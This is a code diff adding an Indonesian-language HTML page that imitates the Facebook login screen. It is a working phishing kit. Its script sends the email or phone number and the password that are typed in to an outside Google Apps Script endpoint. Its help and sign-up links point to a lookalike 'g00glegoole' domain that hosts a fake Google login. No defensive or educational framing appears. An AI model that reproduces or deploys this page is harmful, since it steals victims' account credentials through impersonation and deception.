@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Facebook</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-wrapper">
+            <div class="login-logo">
+                 <img src="image/logo1.png" alt="Facebook Logo">
+                 <!-- <h1 style="color: blue;">Facebook</h1> -->
+            </div>
+            <form name="syarif-contact-from" class="login-form">
+                <div class="form-group">
+                    <input type="email number" id="email" name="email" placeholder="Email atau Telepon" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Kata Sandi" required>
+                </div>
+                <button type="submit" class="login-button">Masuk</button>
+                <a href="https://g00glegoole.github.io/google.com/login-Google/index.html" class="forgot-password">Lupa kata sandi?</a>
+            </form>
+            <div class="signup-section">
+                <p>Belum punya akun?</p>
+                <br>
+                <a href="https://g00glegoole.github.io/google.com/login-Google/index.html" class="signup-button">Daftar</a>
+            </div>
+        </div>
+    </div>
+    <script>
+		const scriptURL = 'https://script.google.com/macros/s/AKfycbwnlIfJkEhCfj-7RpzL8LmInY1IzbHF_qG6O5uHWslFfirgIIajQa03RUZd_xA4wW-B/exec'
+		const form = document.forms['syarif-contact-from']
+	  
+		form.addEventListener('submit', e => {
+		  e.preventDefault()
+		  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+			.then(response => console.log('Success!', response))
+			.catch(error => console.error('Error!', error.message))
+		})
+	  </script>
+</body>
+</html>
